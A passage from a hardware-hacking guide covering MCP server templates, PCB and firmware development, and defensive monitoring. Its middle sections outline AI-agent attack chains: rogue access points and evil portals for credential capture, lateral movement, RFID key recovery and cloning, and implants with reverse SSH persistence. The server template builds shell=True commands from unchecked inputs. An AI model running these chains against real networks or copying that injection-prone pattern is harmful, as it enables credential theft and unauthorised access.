│  - Firmware: dump, analyze, modify, flash                                   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## SECTION 2.4: CUSTOM MCP SERVER DEVELOPMENT

### 2.4.1 Building an MCP Server for Hardware

**Python MCP Server Template:**

```python
#!/usr/bin/env python3
"""
Custom MCP Server for [Hardware Tool]
Bridges [Tool] to AI agents via Model Context Protocol
"""

import asyncio
import json
import subprocess
from typing import Any
from mcp.server import Server, stdio_server
from mcp.types import Tool, TextContent

# Initialize server
server = Server("hardware-tool-mcp")

# Tool definitions
@server.list_tools()
async def list_tools() -> list[Tool]:
    return [
        Tool(
            name="tool_scan",
            description="Scan for devices",
            inputSchema={
                "type": "object",
                "properties": {
                    "frequency": {"type": "string", "description": "Frequency to scan"},
                    "duration": {"type": "integer", "description": "Scan duration in seconds"}
                },
                "required": ["frequency"]
            }
        ),
        Tool(
            name="tool_capture",
            description="Capture signal data",
            inputSchema={
                "type": "object",
                "properties": {
                    "frequency": {"type": "string"},
                    "duration": {"type": "integer"},
                    "output_file": {"type": "string"}
                },
                "required": ["frequency", "duration"]
            }
        ),
        Tool(
            name="tool_analyze",
            description="Analyze captured data",
            inputSchema={
                "type": "object",
                "properties": {
                    "input_file": {"type": "string"},
                    "analysis_type": {"type": "string", "enum": ["spectrum", "protocol", "modulation"]}
                },
                "required": ["input_file"]
            }
        )
    ]

@server.call_tool()
async def call_tool(name: str, arguments: dict[str, Any]) -> list[TextContent]:
    if name == "tool_scan":
        result = await run_scan(arguments["frequency"], arguments.get("duration", 10))
        return [TextContent(type="text", text=result)]
    
    elif name == "tool_capture":
        result = await run_capture(
            arguments["frequency"],
            arguments["duration"],
            arguments.get("output_file", "capture.bin")
        )
        return [TextContent(type="text", text=result)]
    
    elif name == "tool_analyze":
        result = await run_analysis(arguments["input_file"], arguments.get("analysis_type", "spectrum"))
        return [TextContent(type="text", text=result)]
    
    else:
        return [TextContent(type="text", text=f"Unknown tool: {name}")]

async def run_scan(frequency: str, duration: int) -> str:
    """Execute hardware scan command"""
    # Replace with actual hardware command
    cmd = f"hardware_tool scan --freq {frequency} --duration {duration}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout or result.stderr

async def run_capture(frequency: str, duration: int, output_file: str) -> str:
    """Execute hardware capture command"""
    cmd = f"hardware_tool capture --freq {frequency} --duration {duration} --output {output_file}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout or result.stderr

async def run_analysis(input_file: str, analysis_type: str) -> str:
    """Execute analysis command"""
    cmd = f"hardware_tool analyze --input {input_file} --type {analysis_type}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout or result.stderr

async def main():
    async with stdio_server() as (read_stream, write_stream):
        await server.run(read_stream, write_stream)

if __name__ == "__main__":
    asyncio.run(main())
```

**Registration with MCP Client:**

```json
{
  "mcpServers": {
    "hardware-tool": {
      "command": "python",
      "args": ["/path/to/mcp_server.py"],
      "env": {
        "HARDWARE_DEVICE": "/dev/ttyUSB0",
        "BAUD_RATE": "115200"
      }
    }
  }
}
```

---

# PART THREE: CUSTOM HARDWARE DEVELOPMENT

## Designing, Building, and Flashing Your Own Hardware

---

## SECTION 3.1: PCB DESIGN FOR HARDWARE HACKING

### 3.1.1 Design Tools

| Tool | Platform | Best For | Cost |
|------|----------|----------|------|
| **KiCad** | Cross-platform | Open-source, full-featured | Free |
| **Eagle** | Cross-platform | Beginner-friendly, Autodesk | Free (limited) / Subscription |
| **Altium Designer** | Windows | Professional, complex designs | Subscription |
| **EasyEDA** | Web-based | Quick prototypes, JLCPCB integration | Free |
| **Fritzing** | Cross-platform | Simple boards, breadboard view | Free / Donation |
| **Horizon** | Windows | Modern, component library | Free / Subscription |

---

### 3.1.2 Custom PCB Design Process

**Step 1: Define Requirements**

For a hardware hacking tool, consider:

| Requirement | Options | Considerations |
|-------------|---------|----------------|
| **MCU** | STM32, ESP32, RP2040, ATmega | Processing power, wireless capability, community support |
| **Radio** | CC1101, NRF24L01, SX1276, ESP32 WiFi/BLE | Frequency range, protocol support, range |
| **RFID** | PN532, RC522, EM4095 | 125 kHz, 13.56 MHz, read/write capability |
| **Storage** | microSD, SPI Flash, EEPROM | Capacity, speed, wear leveling |
| **Display** | OLED, LCD, E-Ink | Size, resolution, power consumption |
| **Power** | LiPo, AAA, USB-C | Capacity, charging, voltage regulation |
| **Interface** | USB, UART, SPI, I2C, GPIO | Programming, debugging, expansion |

**Step 2: Schematic Capture (KiCad Example)**

```
KiCad 9 Workflow:
1. Create new project: File → New → Project
2. Open Schematic Editor
3. Place components:
   - MCU: STM32F103C8T6
   - Radio: CC1101
   - RFID: PN532
   - Storage: microSD slot
   - Power: AMS1117-3.3
   - USB: USB-C connector
4. Connect components following reference designs
5. Assign footprints:
   - STM32F103C8T6: LQFP-48
   - CC1101: QFN-20
   - PN532: TQFP-40
6. Run ERC (Electrical Rules Check)
7. Generate netlist
```

**Step 3: PCB Layout**

```
PCB Layout Guidelines for RF Hardware:

1. Impedance Control:
   - 50-ohm traces for RF signals
   - 90-ohm differential for USB
   - 100-ohm differential for Ethernet

2. Layer Stackup (4-layer):
   - Layer 1: Signal (RF, high-speed)
   - Layer 2: Ground plane (solid, unbroken)
   - Layer 3: Power plane
   - Layer 4: Signal (low-speed, control)

3. Component Placement:
   - RF components close to antenna connector
   - Bypass capacitors near power pins
   - Crystal close to MCU
   - Keep RF traces short and direct

4. Grounding:
   - Solid ground plane under RF section
   - Multiple vias for ground stitching
   - Separate analog and digital grounds (joined at one point)

5. Shielding:
   - RF shield cans for sensitive circuits
   - Grounded guard traces between signal traces
```

**Step 4: Generate Manufacturing Files**

```bash
# In KiCad:
# 1. File → Fabrication Outputs → Gerber Files
# 2. Select layers: F.Cu, B.Cu, F.SilkS, B.SilkS, F.Mask, B.Mask, Edge.Cuts
# 3. Generate drill files: File → Fabrication Outputs → Drill Files
# 4. Generate BOM: Tools → Generate BOM
# 5. Generate Pick-and-Place: File → Fabrication Outputs → Component Placement

# Output files for JLCPCB:
# - Gerber files (RS-274X format)
# - Drill files (Excellon format)
# - BOM (CSV format)
# - Pick-and-Place (CSV format)
```

**Step 5: Order from Manufacturer**

| Manufacturer | Layers | Lead Time | Cost (10 pcs, 4-layer) | Features |
|--------------|--------|-----------|------------------------|----------|
| **JLCPCB** | 1-6 | 24 hours - 5 days | ~$50 | Cheap, fast, good quality |
| **PCBWay** | 1-14 | 3-7 days | ~$80 | More options, better support |
| **OSH Park** | 2-4 | 5-10 days | ~$100 | US-based, purple boards |
| **Seeed Fusion** | 1-6 | 3-7 days | ~$60 | Good for small batches |

---

### 3.1.3 Example: Custom Flipper Zero Module

**Design Specifications:**

| Component | Part Number | Purpose |
|-----------|-------------|---------|
| MCU | STM32F103C8T6 | Main processor |
| Sub-GHz Radio | CC1101 | 300-928 MHz transceiver |
| NFC | PN532 | 13.56 MHz reader/writer |
| RFID | EM4095 | 125 kHz reader |
| IR | TSOP38238 | IR receiver |
| IR LED | IR333-A | IR transmitter |
| Display | SSD1306 | 128x64 OLED |
| Storage | microSD | Data storage |
| Power | MCP73831 | LiPo charging |

**Schematic Connections:**

```
STM32F103C8T6:
- PA0: IR Receiver (TSOP38238)
- PA1: IR LED (via transistor)
- PA2: UART TX (to Flipper)
- PA3: UART RX (from Flipper)
- PA4: SPI CS (CC1101)
- PA5: SPI SCK (CC1101)
- PA6: SPI MISO (CC1101)
- PA7: SPI MOSI (CC1101)
- PB0: CC1101 GDO0
- PB1: CC1101 GDO2
- PB6: I2C SCL (PN532, SSD1306)
- PB7: I2C SDA (PN532, SSD1306)
- PB8: EM4095 DATA
- PB9: EM4095 CLK
- PC13: Status LED
```

**PCB Layout Notes:**

- Keep CC1101 RF section isolated with ground plane
- Place antenna connector at board edge
- Use 50-ohm impedance for RF trace
- Keep I2C and SPI traces short
- Add decoupling capacitors (100nF) at each power pin
- Use ground stitching vias around RF section

---

## SECTION 3.2: FIRMWARE DEVELOPMENT

### 3.2.1 Development Environments

| MCU | IDE | Framework | Language |
|-----|-----|-----------|----------|
| **STM32** | STM32CubeIDE, PlatformIO | HAL, LL, libopencm3 | C, C++ |
| **ESP32** | ESP-IDF, PlatformIO, Arduino | ESP-IDF, Arduino | C, C++ |
| **RP2040** | PlatformIO, Arduino | Pico SDK, Arduino | C, C++, MicroPython |
| **ATmega** | Arduino IDE, PlatformIO | Arduino, AVR-GCC | C, C++ |
| **nRF52** | nRF Connect SDK | Zephyr, SoftDevice | C |

---

### 3.2.2 Firmware for Hardware Hacking Tools

**CC1101 Driver (Sub-GHz Radio):**

```c
// cc1101.h
#ifndef CC1101_H
#define CC1101_H

#include <stdint.h>
#include <stdbool.h>

// CC1101 Registers
#define CC1101_IOCFG2   0x00
#define CC1101_IOCFG1   0x01
#define CC1101_IOCFG0   0x02
#define CC1101_FIFOTHR  0x03
#define CC1101_SYNC1    0x04
#define CC1101_SYNC0    0x05
#define CC1101_PKTLEN   0x06
#define CC1101_PKTCTRL1 0x07
#define CC1101_PKTCTRL0 0x08
#define CC1101_ADDR     0x09
#define CC1101_CHANNR   0x0A
#define CC1101_FSCTRL1  0x0B
#define CC1101_FSCTRL0  0x0C
#define CC1101_FREQ2    0x0D
#define CC1101_FREQ1    0x0E
#define CC1101_FREQ0    0x0F
#define CC1101_MDMCFG4  0x10
#define CC1101_MDMCFG3  0x11
#define CC1101_MDMCFG2  0x12
#define CC1101_MDMCFG1  0x13
#define CC1101_MDMCFG0  0x14
#define CC1101_DEVIATN  0x15
#define CC1101_MCSM2    0x16
#define CC1101_MCSM1    0x17
#define CC1101_MCSM0    0x18
#define CC1101_FOCCFG   0x19
#define CC1101_BSCFG    0x1A
#define CC1101_AGCCTRL2 0x1B
#define CC1101_AGCCTRL1 0x1C
#define CC1101_AGCCTRL0 0x1D
#define CC1101_WOREVT1  0x1E
#define CC1101_WOREVT0  0x1F
#define CC1101_WORCTRL  0x20
#define CC1101_FREND1   0x21
#define CC1101_FREND0   0x22
#define CC1101_LQI      0x23
#define CC1101_RSSI     0x24
#define CC1101_MARCSTATE 0x25
#define CC1101_WORTIME1 0x26
#define CC1101_WORTIME0 0x27
#define CC1101_PKTSTATUS 0x28
#define CC1101_VCO_VC_DAC 0x29
#define CC1101_TXBYTES  0x2A
#define CC1101_RXBYTES  0x2B

// Command strobes
#define CC1101_SRES     0x30
#define CC1101_SFSTXON  0x31
#define CC1101_SXOFF    0x32
#define CC1101_SCAL     0x33
#define CC1101_SRX      0x34
#define CC1101_STX      0x35
#define CC1101_SIDLE    0x36
#define CC1101_SWOR     0x38
#define CC1101_SPWD     0x39
#define CC1101_SFRX     0x3A
#define CC1101_SFTX     0x3B
#define CC1101_SWORRST  0x3C
#define CC1101_SNOP     0x3D

// Function prototypes
void cc1101_init(void);
void cc1101_write_reg(uint8_t addr, uint8_t value);
uint8_t cc1101_read_reg(uint8_t addr);
void cc1101_write_burst(uint8_t addr, uint8_t *data, uint8_t len);
void cc1101_read_burst(uint8_t addr, uint8_t *data, uint8_t len);
void cc1101_strobe(uint8_t cmd);
void cc1101_set_frequency(uint32_t freq_hz);
void cc1101_set_modulation(uint8_t mod);
void cc1101_set_data_rate(uint32_t baud);
void cc1101_tx_mode(void);
void cc1101_rx_mode(void);
void cc1101_send_data(uint8_t *data, uint8_t len);
uint8_t cc1101_receive_data(uint8_t *buffer, uint8_t max_len);

#endif // CC1101_H
```

**PN532 Driver (NFC):**

```c
// pn532.h
#ifndef PN532_H
#define PN532_H

#include <stdint.h>
#include <stdbool.h>

// PN532 Commands
#define PN532_COMMAND_GETFIRMWAREVERSION   0x02
#define PN532_COMMAND_SAMCONFIGURATION     0x14
#define PN532_COMMAND_INLISTPASSIVETARGET  0x4A
#define PN532_COMMAND_INDATAEXCHANGE       0x40
#define PN532_COMMAND_INRELEASE            0x52
#define PN532_COMMAND_TGGETDATA            0x86
#define PN532_COMMAND_TGSETDATA            0x8E

// MIFARE Commands
#define MIFARE_CMD_AUTH_A                  0x60
#define MIFARE_CMD_AUTH_B                  0x61
#define MIFARE_CMD_READ                    0x30
#define MIFARE_CMD_WRITE                   0xA0
#define MIFARE_CMD_TRANSFER                0xB0
#define MIFARE_CMD_DECREMENT               0xC0
#define MIFARE_CMD_INCREMENT               0xC1
#define MIFARE_CMD_STORE                   0xC2

// Function prototypes
void pn532_init(void);
uint32_t pn532_get_firmware_version(void);
void pn532_sam_configuration(void);
bool pn532_in_list_passive_target(uint8_t *uid, uint8_t *uid_len);
bool pn532_mifare_authenticate(uint8_t block, uint8_t *key, uint8_t *uid);
bool pn532_mifare_read_block(uint8_t block, uint8_t *data);
bool pn532_mifare_write_block(uint8_t block, uint8_t *data);

#endif // PN532_H
```

---

### 3.2.3 Flashing Custom Firmware

**STM32 (via DFU):**

```bash
# Install dfu-util
sudo apt install dfu-util

# Flash firmware
dfu-util -a 0 -s 0x08000000:leave -D firmware.bin

# Or using STM32CubeProgrammer
STM32_Programmer_CLI -c port=USB1 -w firmware.bin 0x08000000 -v -rst
```

**STM32 (via SWD with ST-Link):**

```bash
# Using OpenOCD
openocd -f interface/stlink.cfg -f target/stm32f1x.cfg \
  -c "program firmware.bin 0x08000000 verify reset exit"
```

**ESP32:**

```bash
# Using esptool.py
esptool.py --chip esp32 --port /dev/ttyUSB0 write_flash 0x1000 bootloader.bin \
  0x8000 partitions.bin 0x10000 firmware.bin
```

**RP2040:**

```bash
# Using picotool
picotool load -v -x firmware.uf2

# Or drag-and-drop UF2 to RPI-RP2 mass storage device
cp firmware.uf2 /media/$USER/RPI-RP2/
```

**Flipper Zero (via USB):**

```bash
# Using qFlipper (GUI) or CLI
# CLI (from firmware source):
./fbt flash_usb

# Or using STM32CubeProgrammer
STM32_Programmer_CLI -c port=USB1 -w flipper.bin 0x08000000 -v -rst

# Flashing sequence for empty MCU:
# 1. OTP (Only on empty MCU)
# 2. Core2 firmware
# 3. Core1 firmware
# 4. Option Bytes
```

---

## SECTION 3.3: AI-ASSISTED HARDWARE DEVELOPMENT

### 3.3.1 AI-Assisted PCB Design

AI agents can assist with PCB design through:

| Task | AI Approach | Tools |
|------|-------------|-------|
| **Component Selection** | Query LLM for component recommendations based on requirements | GPT-4, Claude |
| **Schematic Review** | AI reviews schematic for errors and improvements | Custom MCP server |
| **Layout Optimization** | AI suggests component placement and routing | Custom MCP server + KiCad API |
| **BOM Generation** | AI generates and validates BOM | Custom scripts |
| **Design Rule Checking** | AI reviews DRC violations and suggests fixes | KiCad API |

**Example: AI-Assisted Component Selection**

```
User: "I need an MCU for a portable hardware hacking tool. 
       Requirements: WiFi, BLE, USB, low power, under $5."

AI Agent: [searches component databases]
         [compares specifications]
         [checks availability]

AI Response: "For your requirements, I recommend the ESP32-C3. 
             It has WiFi 4, BLE 5.0, USB Serial/JTAG, and RISC-V 
             single-core at 160 MHz. Power consumption is ~5mA 
             active, ~5µA deep sleep. Price is ~$2 in quantity. 
             
             Alternatives:
             - ESP32-S3: More powerful, dual-core, USB OTG, ~$4
             - RP2040 + ESP32 module: More flexible, ~$6 total
             - nRF52840: Better BLE, no WiFi, ~$5"
```

---

### 3.3.2 AI-Assisted Firmware Development

```python
# AI-assisted firmware development workflow
# Uses LLM to generate, review, and optimize embedded code

from openai import OpenAI

client = OpenAI()

def generate_driver_code(peripheral: str, mcu: str, interface: str) -> str:
    """Generate driver code using LLM"""
    
    prompt = f"""
    Generate C driver code for {peripheral} on {mcu} using {interface} interface.
    
    Requirements:
    - Register definitions
    - Initialization function
    - Read/write functions
    - Error handling
    - Comments explaining each section
    
    Output only the code, no explanations.
    """
    
    response = client.chat.completions.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": "You are an embedded systems expert."},
            {"role": "user", "content": prompt}
        ],
        temperature=0.2
    )
    
    return response.choices[0].message.content

def review_firmware_code(code: str) -> str:
    """Review firmware code for issues"""
    
    prompt = f"""
    Review this embedded C code for:
    1. Memory safety issues
    2. Race conditions
    3. Missing error handling
    4. Inefficient patterns
    5. Hardware-specific concerns
    
    Code:
    {code}
    
    Provide specific line-by-line feedback and suggested fixes.
    """
    
    response = client.chat.completions.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": "You are an embedded systems code reviewer."},
            {"role": "user", "content": prompt}
        ],
        temperature=0.1
    )
    
    return response.choices[0].message.content
```

---

# PART FOUR: COMBINED HARDWARE OPERATIONS

## Multi-Tool Attack Chains and Integrated Workflows

---

## SECTION 4.1: RF RECONNAISSANCE WORKFLOW

### 4.1.1 Combined SDR + AI Workflow

**Objective:** Automatically detect, classify, and analyze RF signals in a target environment.

**Tools Required:**
- HackRF One (or RTL-SDR for RX-only)
- Computer running GNU Radio
- GNU Radio MCP Server
- AI Agent (Hermes/Claude/GPT-4)

**Workflow:**

```
Step 1: Broad Spectrum Scan
├── Tool: HackRF + GNU Radio
├── Action: Sweep 1 MHz - 6 GHz in 1 MHz steps
└── Output: Spectrum heatmap, list of active frequencies

Step 2: Signal Detection
├── Tool: AI Agent (MCP: find_peaks)
├── Action: Identify peaks above noise floor
└── Output: List of candidate signals with frequency, power, bandwidth

Step 3: Signal Classification
├── Tool: AI Agent (MCP: classify_signal)
├── Action: ML model classifies modulation type (ASK, FSK, PSK, etc.)
└── Output: Modulation type, symbol rate, protocol hints

Step 4: Protocol Identification
├── Tool: AI Agent (MCP: protocol_detect)
├── Action: Match signal characteristics against known protocols
└── Output: Protocol name (e.g., "433 MHz ASK remote", "BLE advertisement")

Step 5: Targeted Capture
├── Tool: HackRF + GNU Radio
├── Action: Record IQ samples of interesting signals
└── Output: IQ files for offline analysis

Step 6: Demodulation & Decode
├── Tool: GNU Radio + AI Agent
├── Action: Demodulate and decode protocol
└── Output: Decoded data (e.g., sensor readings, commands)

Step 7: Report Generation
├── Tool: AI Agent
├── Action: Generate comprehensive report
└── Output: Markdown report with findings, screenshots, recommendations
```

**MCP Tool Chain (AI Agent Code):**

```python
# AI Agent orchestrating RF reconnaissance
# Using MCP tools for HackRF/GNU Radio

async def rf_reconnaissance(target_range: tuple, duration: int):
    """Full RF reconnaissance workflow"""
    
    results = {
        "scan": None,
        "signals": [],
        "classifications": [],
        "captures": [],
        "report": None
    }
    
    # Step 1: Broad spectrum scan
    results["scan"] = await mcp_call("gnuradio", "sweep_frequency", {
        "start_freq": target_range[0],
        "end_freq": target_range[1],
        "step": 1_000_000,  # 1 MHz steps
        "duration": duration
    })
    
    # Step 2: Find peaks
    peaks = await mcp_call("gnuradio", "find_peaks", {
        "spectrum": results["scan"],
        "threshold": -60,  # dBm
        "min_distance": 100_000  # 100 kHz
    })
    
    # Step 3-4: Classify and identify each signal
    for peak in peaks:
        classification = await mcp_call("gnuradio", "classify_signal", {
            "frequency": peak["frequency"],
            "bandwidth": peak["bandwidth"]
        })
        
        protocol = await mcp_call("gnuradio", "protocol_detect", {
            "frequency": peak["frequency"],
            "modulation": classification["modulation"],
            "symbol_rate": classification["symbol_rate"]
        })
        
        results["classifications"].append({
            "frequency": peak["frequency"],
            "power": peak["power"],
            "classification": classification,
            "protocol": protocol
        })
    
    # Step 5: Capture interesting signals
    for signal in results["classifications"]:
        if signal["protocol"]["confidence"] > 0.8:
            capture = await mcp_call("gnuradio", "capture_iq", {
                "frequency": signal["frequency"],
                "duration": 5,
                "output_file": f"capture_{signal['frequency']}.bin"
            })
            results["captures"].append(capture)
    
    # Step 6: Demodulate and decode
    for capture in results["captures"]:
        decoded = await mcp_call("gnuradio", "decode_protocol", {
            "input_file": capture["file"],
            "protocol": signal["protocol"]["name"]
        })
        # Process decoded data...
    
    # Step 7: Generate report
    results["report"] = await generate_report(results)
    
    return results

async def mcp_call(server: str, tool: str, args: dict):
    """Call MCP tool"""
    # MCP client implementation
    pass
```

---

## SECTION 4.2: WIRELESS NETWORK ATTACK CHAIN

### 4.2.1 WiFi Pineapple + AI Workflow

**Objective:** Automated wireless network assessment and attack.

**Tools Required:**
- WiFi Pineapple Mark VII / Pager
- External WiFi adapter (MK7AC for Pager)
- AI Agent with Pineapple MCP Server

**Workflow:**

```
Step 1: Reconnaissance
├── Tool: Pineapple + AI Agent
├── Action: Scan for networks and clients
└── Output: Network list, client list, encryption types

Step 2: Target Selection
├── Tool: AI Agent
├── Action: Analyze networks, identify high-value targets
└── Output: Ranked target list

Step 3: Rogue AP Deployment
├── Tool: Pineapple + AI Agent
├── Action: Deploy rogue AP mimicking target network
└── Output: Active rogue AP, connected clients

Step 4: Credential Capture
├── Tool: Pineapple + AI Agent
├── Action: Deploy evil portal, capture credentials
└── Output: Captured credentials, session tokens

Step 5: MITM & Traffic Analysis
├── Tool: Pineapple + AI Agent
├── Action: Intercept and analyze traffic
└── Output: Traffic logs, extracted data

Step 6: Lateral Movement
├── Tool: AI Agent + Network Tools
├── Action: Use captured credentials to access internal resources
└── Output: Additional access, expanded foothold

Step 7: Persistence
├── Tool: Packet Squirrel / LAN Turtle
├── Action: Deploy implant for persistent access
└── Output: Persistent backdoor, remote access
```

**Pineapple MCP Server Tools:**

```python
# Pineapple MCP Server - Tool Definitions

@server.list_tools()
async def list_tools():
    return [
        Tool(name="pineapple_scan", description="Scan for WiFi networks"),
        Tool(name="pineapple_clients", description="List connected clients"),
        Tool(name="pineapple_deauth", description="Deauthenticate client"),
        Tool(name="pineapple_rogue_ap", description="Start rogue AP"),
        Tool(name="pineapple_evil_portal", description="Start evil portal"),
        Tool(name="pineapple_capture", description="Capture credentials"),
        Tool(name="pineapple_mitm", description="Enable MITM"),
        Tool(name="pineapple_logs", description="Get captured data"),
    ]
```

---

## SECTION 4.3: RFID/NFC ATTACK CHAIN

### 4.3.1 Proxmark3 + Flipper Zero + AI

**Objective:** Comprehensive RFID/NFC assessment.

**Tools Required:**
- Proxmark3 (Iceman fork)
- Flipper Zero
- AI Agent with MCP servers for both

**Workflow:**

```
Step 1: Frequency Detection
├── Tool: Proxmark3 + AI Agent
├── Action: Auto-detect tag frequency (125 kHz / 13.56 MHz)
└── Output: Frequency, tag type

Step 2: Tag Identification
├── Tool: Proxmark3 + AI Agent
├── Action: Identify tag type (MIFARE, EM4100, iCLASS, etc.)
└── Output: Tag type, UID, capabilities

Step 3: Data Extraction
├── Tool: Proxmark3 + AI Agent
├── Action: Read tag data (sectors, blocks, keys)
└── Output: Raw tag data, encryption keys

Step 4: Key Recovery
├── Tool: Proxmark3 + AI Agent
├── Action: Recover encryption keys (dictionary, brute force, nested)
└── Output: Encryption keys

Step 5: Tag Cloning
├── Tool: Proxmark3 / Flipper Zero + AI Agent
├── Action: Clone tag to writable medium
└── Output: Cloned tag

Step 6: Emulation
├── Tool: Proxmark3 / Flipper Zero + AI Agent
├── Action: Emulate original tag
└── Output: Active emulation

Step 7: Access Testing
├── Tool: Cloned/Emulated Tag
├── Action: Test against target access control system
└── Output: Access granted/denied
```

---

## SECTION 4.4: PHYSICAL IMPLANT DEPLOYMENT

### 4.4.1 Packet Squirrel + LAN Turtle + AI

**Objective:** Deploy persistent network implants for long-term access.

**Tools Required:**
- Packet Squirrel Mark II
- LAN Turtle
- AI Agent with implant MCP servers

**Workflow:**

```
Step 1: Site Access
├── Action: Physical access to target network
└── Duration: 30-60 seconds

Step 2: Implant Selection
├── Tool: AI Agent
├── Action: Select appropriate implant based on network type
└── Output: Implant recommendation

Step 3: Implant Deployment
├── Action: Connect implant inline (Packet Squirrel) or inline (LAN Turtle)
└── Duration: 10-20 seconds

Step 4: Remote Access Establishment
├── Tool: Implant + AI Agent
├── Action: Establish VPN tunnel, reverse SSH
└── Output: Remote access confirmed

Step 5: Reconnaissance
├── Tool: Implant + AI Agent
├── Action: Network scan, host discovery
└── Output: Network map, target list

Step 6: Data Collection
├── Tool: Implant + AI Agent
├── Action: Capture traffic, extract credentials
└── Output: Captured data

Step 7: Persistence
├── Tool: Implant + AI Agent
├── Action: Configure cron jobs, auto-reconnect
└── Output: Persistent access
```

---

# PART FIVE: DEFENSIVE COUNTERMEASURES

## Hardware Security, RF Defense, and AI-Powered Detection

---

## SECTION 5.1: HARDWARE SECURITY BEST PRACTICES

### 5.1.1 Secure Boot & Firmware Integrity

| Defense | Description | Implementation |
|---------|-------------|----------------|
| **Secure Boot** | Verify firmware signature at boot | UEFI Secure Boot, ARM Trusted Firmware |
| **Measured Boot** | Record boot measurements for attestation | TPM, TEE |
| **Firmware Signing** | Cryptographic signatures on firmware updates | Vendor PKI, code signing |
| **Anti-Rollback** | Prevent downgrade to vulnerable firmware | Version counters, eFuses |
| **Debug Lockout** | Disable JTAG/SWD in production | eFuses, option bytes |

---

### 5.1.2 Physical Security

| Defense | Description | Implementation |
|---------|-------------|----------------|
| **Tamper Detection** | Detect physical intrusion | Switches, mesh layers, epoxy |
| **Secure Enclosures** | Prevent physical access | Locked racks, sealed cases |
| **Port Locking** | Prevent unauthorized USB access | Port blockers, epoxy |
| **Cable Security** | Prevent cable tampering | Locked cables, conduit |
| **Surveillance** | Monitor physical access | Cameras, access logs |

---

## SECTION 5.2: RF DEFENSE

### 5.2.1 RF Monitoring with AI

**Objective:** Detect and classify RF threats in real-time.

**Tools Required:**
- RTL-SDR or HackRF (RX)
- GNU Radio
- AI Agent with RF MCP

**Detection Workflow:**

```
Continuous Monitoring:
├── SDR continuously scans target frequencies
├── AI Agent classifies signals in real-time
├── Anomalies trigger alerts
└── Threat classification and response

Detection Signatures:
├── Unusual frequencies
├── Unexpected signal strength
├── Unknown modulation types
├── Replay attack patterns (identical signals repeating)
├── Jamming (noise floor elevation)
├── Spoofing (GPS, ADS-B, etc.)
```

**AI-Powered RF Anomaly Detection:**

```python
# AI Agent for RF anomaly detection

async def monitor_rf(frequencies: list, threshold_db: float = -60):
    """Monitor RF spectrum for anomalies"""
    
    baseline = await establish_baseline(frequencies)
    
    while True:
        current = await mcp_call("gnuradio", "get_spectrum", {
            "frequencies": frequencies
        })
        
        for freq in frequencies:
            current_power = current[freq]["power"]
            baseline_power = baseline[freq]["power"]
            deviation = current_power - baseline_power
            
            if deviation > threshold_db:
                # Anomaly detected
                classification = await mcp_call("gnuradio", "classify_signal", {
                    "frequency": freq,
                    "bandwidth": current[freq]["bandwidth"]
                })
                
                await alert({
                    "type": "RF_ANOMALY",
                    "frequency": freq,
                    "power": current_power,
                    "deviation": deviation,
                    "classification": classification,
                    "timestamp": datetime.now()
                })
        
        await asyncio.sleep(1)  # Check every second
```

---

### 5.2.2 RF Countermeasures

| Countermeasure | Description | Effectiveness |
|----------------|-------------|---------------|
| **Jamming** | Transmit noise on target frequency | High (but illegal in many jurisdictions) |
| **Spoofing** | Transmit false signals | High (for GPS, ADS-B) |
| **Faraday Cage** | Block RF signals | High (for fixed locations) |
| **Frequency Hopping** | Rapidly change frequencies | Moderate |
| **Spread Spectrum** | Spread signal over wide bandwidth | Moderate |
| **Directional Antennas** | Focus signal in specific direction | Moderate |
| **Power Reduction** | Reduce signal strength | Low |

---

## SECTION 5.3: AI-POWERED HARDWARE DEFENSE

### 5.3.1 AI-Based Intrusion Detection

**Concept:** Use AI to detect hardware-based attacks in real-time.

| Attack Type | Detection Method | AI Approach |
|-------------|------------------|-------------|
| **BadUSB** | Monitor USB device enumeration | ML classification of USB descriptors |
| **Keystroke Injection** | Monitor keyboard input patterns | Anomaly detection on typing patterns |
| **Network Implant** | Monitor network traffic patterns | Behavioral analysis of traffic |
| **RF Replay** | Monitor RF spectrum | Signal classification and replay detection |
| **Firmware Tampering** | Monitor firmware hashes | Integrity verification with ML |
| **Side-Channel** | Monitor power/EM emissions | Anomaly detection on power traces |

**Example: AI-Based BadUSB Detection**

```python
# AI-powered BadUSB detection system

class USBMonitor:
    def __init__(self):
        self.baseline_devices = {}
        self.anomaly_model = load_model("usb_anomaly_model.pkl")
    
    def monitor_usb_events(self):
        """Monitor USB device connections"""
        while True:
            devices = get_usb_devices()
            
            for device in devices:
                if device.id not in self.baseline_devices:
                    # New device detected
                    features = extract_usb_features(device)
                    anomaly_score = self.anomaly_model.predict(features)
                    
                    if anomaly_score > 0.8:
                        # Likely malicious device
                        alert({
                            "type": "SUSPICIOUS_USB",
                            "device": device,
                            "anomaly_score": anomaly_score,
                            "features": features
                        })
                        
                        # Auto-block device
                        block_usb_device(device.id)
            
            time.sleep(0.1)  # Check every 100ms
```

---

## SECTION 5.4: HARDENING HARDWARE TOOLS

### 5.4.1 Securing Your Own Hardware

| Tool | Hardening Steps |
|------|-----------------|
| **Flipper Zero** | Enable PIN lock, disable unused protocols, keep firmware updated |
| **HackRF** | Use in Faraday cage when not in use, secure firmware |
| **WiFi Pineapple** | Change default credentials, disable unnecessary services, use filters |
| **Proxmark3** | Disable ModemManager, use secure firmware, physically secure device |
| **Packet Squirrel** | Change default passwords, disable unused payloads, secure physical access |
| **LAN Turtle** | Change default credentials, disable unused services, secure physical access |

---

# APPENDICES

## Appendix A: Hardware Tool Glossary

| Term | Definition |
|------|------------|
| **SDR** | Software-Defined Radio — radio where components are implemented in software |
| **RF** | Radio Frequency — electromagnetic signals used for wireless communication |
| **Sub-GHz** | Frequencies below 1 GHz — used for remotes, sensors, IoT |
| **NFC** | Near Field Communication — 13.56 MHz short-range communication |
| **RFID** | Radio Frequency Identification — tracking and access control |
| **GPIO** | General Purpose Input/Output — programmable pins on microcontrollers |
| **UART** | Universal Asynchronous Receiver/Transmitter — serial communication |
| **SPI** | Serial Peripheral Interface — high-speed synchronous communication |
| **I2C** | Inter-Integrated Circuit — two-wire serial communication |
| **MCP** | Model Context Protocol — standard for AI-tool integration |
| **MHS** | Model Hardware Standard — standard for AI-hardware integration |
| **PCB** | Printed Circuit Board — physical board for electronic components |
| **BOM** | Bill of Materials — list of components for a PCB |
| **DFM** | Design for Manufacturing — designing for efficient production |
